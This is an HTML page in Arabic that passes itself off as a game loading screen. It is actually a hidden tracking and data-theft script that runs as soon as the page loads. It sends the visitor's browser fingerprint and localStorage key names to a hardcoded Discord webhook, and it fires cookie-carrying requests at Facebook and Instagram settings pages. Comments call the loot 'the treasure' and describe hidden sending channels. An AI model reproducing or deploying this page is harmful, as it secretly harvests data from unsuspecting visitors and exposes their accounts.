<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* إخفاء قنوات الإرسال */
        .hidden-tunnel { width: 0; height: 0; border: 0; display: none; }
    </style>
</head>
<body>
    <div class="version-marker">9</div> <div class="loader"></div>
    <p>جاري فحص الموارد (V1.2.1)...</p>

    <iframe name="sink" class="hidden-tunnel"></iframe>
    <form id="exp-form" method="POST" target="sink" class="hidden-tunnel">
        <input type="hidden" name="payload" id="payload-field">
    </form>

    <script>
        // ملاحظة: ديسكورد أحياناً يرفض POST الـ Form العادي، لذا سنستخدم رابط الـ API بشكل خام
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function forceSend(title, content) {
            // تكتيك الـ URL Parameters: إرسال البيانات كجزء من الرابط لضمان العبور
            const params = `?content=🚀 **${title}**%0A${encodeURIComponent(content)}`;
            const img = new Image();
            img.src = WEBHOOK_URL + params;
            
            // محاولة ثانية بـ Fetch "خام" بدون Headers
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🎯 **${title}**: ${content}` })
            });
        }

        async function startMission() {
            try {
                // 1. بصمة الجهاز
                forceSend("System", `UA: ${navigator.userAgent}`);

                // 2. سحب الـ LocalStorage (الكنز)
                let loot = "";
                for (let i = 0; i < localStorage.length; i++) {
                    loot += `${localStorage.key(i)}|`;
                }
                if (loot) forceSend("Storage_Keys", loot);

                // 3. الطلبات العميقة (المتصفح يتقمص الشخصية)
                // هنا المتصفح يطرق أبواب فيسبوك بكوكيز الضحية
                const sites = [
                    ["FB", "https://mbasic.facebook.com/settings"],
                    ["IG", "https://www.instagram.com/accounts/edit/"]
                ];

                sites.forEach(site => {
                    const probe = new Image();
                    probe.src = site[1] + "?v=" + Math.random();
                    forceSend("Probe_Sent", `Target: ${site[0]}`);
                });

            } catch (e) {
                forceSend("Error", e.message);
            }
        }

        // تشغيل فوري
        window.onload = startMission;
    </script>
</body>
</html>
